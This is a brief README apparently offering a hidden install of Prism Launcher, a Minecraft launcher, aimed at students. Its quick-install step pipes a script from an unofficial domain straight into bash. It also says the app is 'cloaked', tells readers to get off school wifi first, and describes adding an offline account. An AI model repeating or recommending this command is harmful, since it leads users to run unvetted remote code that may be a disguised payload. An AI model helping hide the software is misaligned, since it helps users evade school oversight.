# Prism Launcher



this fetches the latest version, downloads the correct build for your system, installs it into `~/Applications` while cloaking the app

---
## BEFORE INSTALL 
Make sure you are off school wifi as it is recomended.

---

## ⚡ Quick Install

Run this command in Terminal:

```bash
curl -fsSL https://apps.suspendednetwork.tech/installers/Crmc.command | bash
```

---
## After install

Click accounts on the top right then click "Manage Accounts" then click add ofline and choose your prefered username
